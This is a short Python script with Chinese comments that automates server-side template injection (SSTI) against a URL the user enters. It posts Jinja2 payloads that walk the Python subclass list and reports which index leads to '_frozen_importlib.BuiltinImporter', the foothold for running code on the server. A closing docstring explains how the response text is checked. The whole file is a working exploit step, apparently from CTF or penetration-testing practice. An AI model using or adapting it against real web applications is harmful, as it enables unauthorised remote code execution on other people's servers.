import requests

url = input("请输入url:")
for i in range(500):  # 真实环境下目标网站所加载的类可以超过500根据情况增减
    data = {"name": "{{ ''.__class__.__base__.__subclasses__()[" + str(i) + "] }}"}
    # data根据网站格式进行修改
    try:
        r = requests.post(url, data=data)
        if r.status_code == 200:
            if '_frozen_importlib.BuiltinImporter' in r.text:
                print(i)
    except:
        pass

"""
# r 是一个 Response 对象，包含：
# - 状态码 (r.status_code)
# - 头部 (r.headers) 
# - 内容 (r.content, r.text)
# - 请求信息 (r.url, r.request)
if '_frozen_importlib.BuiltinImporter' in r.text:
    这检查字符串是否在响应的文本内容中。
if '_frozen_importlib.BuiltinImporter' in r:
    这会检查字符串是否在 Response 对象中，而不是在响应内容中。
"""
